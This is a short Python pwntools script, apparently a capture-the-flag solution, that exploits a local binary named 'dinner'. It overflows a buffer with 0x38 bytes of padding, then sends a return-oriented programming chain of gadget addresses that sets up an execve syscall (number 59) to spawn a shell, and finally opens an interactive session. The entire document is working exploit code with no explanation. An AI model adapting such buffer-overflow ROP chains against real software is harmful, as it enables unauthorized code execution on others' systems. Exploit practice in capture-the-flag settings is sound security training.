#!/usr/bin/env python
from pwn import *
e = ELF("./dinner")
p = process("./dinner")
p.recvuntil("(:")
chain = ("i" * 0x38) + "".join(map(p64,[
    0x4005cf,
    59,
    0x4005b4,
    0x400698,
    0x4005bd,
    0,
    0x4005c6,
    0,
    0x4005aa,
]))

p.sendline(chain)
p.interactive()
